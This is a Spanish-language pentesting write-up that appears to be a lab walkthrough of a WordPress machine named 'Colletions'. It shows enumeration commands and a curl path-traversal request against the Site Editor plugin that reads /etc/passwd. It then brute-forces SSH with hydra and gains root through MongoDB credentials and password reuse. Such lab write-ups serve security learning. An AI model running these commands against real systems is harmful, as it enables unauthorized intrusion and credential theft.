---
layout: page
title:  "Colletions!"
date:    2024-11-30 14:14:17 -0505
categories: Pentesting
---
![[Pasted image 20241126143259.png]](/imagenes/Pasted%20image%2020241126143259.png)

escaneamos puertos con nmap  `nmap -p- --open -sCSV -vvv -Pn -n --min-rate 5000 172.17.0.2`

![[Pasted image 20241126143428.png]](/imagenes/Pasted%20image%2020241126143428.png)

entramos en el navegador 

![[Pasted image 20241126143553.png]](/imagenes/Pasted%20image%2020241126143553.png)

buscamos directorios con goubuster `gobuster dir -u "http://172.17.0.2/" -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt` 

![[Pasted image 20241126143720.png]](/imagenes/Pasted%20image%2020241126143720.png)


![[Pasted image 20241126143741.png]](/imagenes/Pasted%20image%2020241126143741.png)

si interactuamos con el sitio web debemos anadir el colletions.dl al host `sudo nano /etc/hosts`  control O, control x luego enter
luego busco directorios en la nueva direccion

![[Pasted image 20241126144527.png]](/imagenes/Pasted%20image%2020241126144527.png)
![[Pasted image 20241126144630.png]](/imagenes/Pasted%20image%2020241126144630.png)

al ver que es wordprees tarto de buscar vulneravilidades con wpscan `wpscan --url http://collections.dl/wordpress/ -e u`     

![[Pasted image 20241126145500.png]](/imagenes/Pasted%20image%2020241126145500.png)
![[Pasted image 20241126145523.png]](/imagenes/Pasted%20image%2020241126145523.png)

buscamos un sploit para el plugin
`searchsploit site editor 1.1`

![[Pasted image 20241126145643.png]](/imagenes/Pasted%20image%2020241126145643.png)

en sploit db encontramos como vulnerar ese plugin 

![[Pasted image 20241126145734.png]](/imagenes/Pasted%20image%2020241126145734.png)

curl "http://172.17.0.2/wordpress/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd" 

![[Pasted image 20241126145827.png]](/imagenes/Pasted%20image%2020241126145827.png)

encontramos los usuarios dbadmin, root y el anteriormente encontrado chocolate usamos hydra para encontrar una contrasena para chocolate
`hydra -l chocolate -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 10`  
    
![[Pasted image 20241126145956.png]](/imagenes/Pasted%20image%2020241126145956.png)

entramos por ssh  vemos que no tenemos permisos sudo y en el directorio tmp encontramos una base de datos mongo recordamos mongo corre en el puerto 27017

![[Pasted image 20241126150107.png]](/imagenes/Pasted%20image%2020241126150107.png)

`mongo --host 172.17.0.2:27017` este comando desde la maquina atacante se debe instalar mongo para que funcione 

![[Pasted image 20241126154311.png]](/imagenes/Pasted%20image%2020241126154311.png)

entramos desde el ssh con las nuevas credenciales y vemos que el usuario root tiene la misma contrasena que el dbadmin

![[Pasted image 20241126154456.png]](/imagenes/Pasted%20image%2020241126154456.png)
